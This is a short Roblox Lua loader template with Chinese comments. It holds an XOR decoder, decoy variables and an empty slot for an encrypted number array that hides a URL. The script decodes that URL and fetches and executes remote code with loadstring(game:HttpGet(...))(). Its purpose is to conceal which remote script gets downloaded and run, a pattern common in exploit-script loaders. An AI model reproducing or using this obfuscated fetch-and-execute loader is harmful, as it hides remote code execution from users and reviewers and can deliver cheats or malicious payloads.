local _RND = math.random
local _NOW = tick
local _A, _B, _C = "无用", {}, nil

local function _XOR(data, key)
    local out = {}
    for i = 1, #data do
        out[i] = string.char(bit32.bxor(data[i], key))
    end
    return table.concat(out)
end

-- =====这里填加密后的数字数组 _ENC =====
local _ENC = {
-- 这里放加密生成的数字列表
}
local _URL = _XOR(_ENC, 85) -- 85是密钥，可以随便改成别的数字
loadstring(game:HttpGet(_URL,true))()
